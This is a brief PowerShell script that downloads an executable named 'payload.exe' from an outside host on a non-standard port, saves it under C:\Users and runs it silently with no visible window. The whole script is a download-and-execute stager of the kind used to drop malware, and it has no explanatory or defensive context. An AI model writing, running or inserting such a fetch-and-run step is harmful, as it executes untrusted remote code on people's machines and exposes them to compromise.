# URL of the executable to download
$url = "http://vyapar.vaisworks.com:32774/payload.exe"

# Destination path where the executable will be saved
$destination = "C:\Users\payload.exe"

# Command to execute the downloaded executable silently
$installCommand = "$destination /silent"

# Download the executable
Invoke-WebRequest -Uri $url -OutFile $destination

# Check if the download was successful
if (Test-Path $destination) {
    # Execute the downloaded executable silently
    Start-Process -FilePath $installCommand -Wait -NoNewWindow
    Write-Host "Installation completed."
} else {
    Write-Host "Failed to download the executable."
}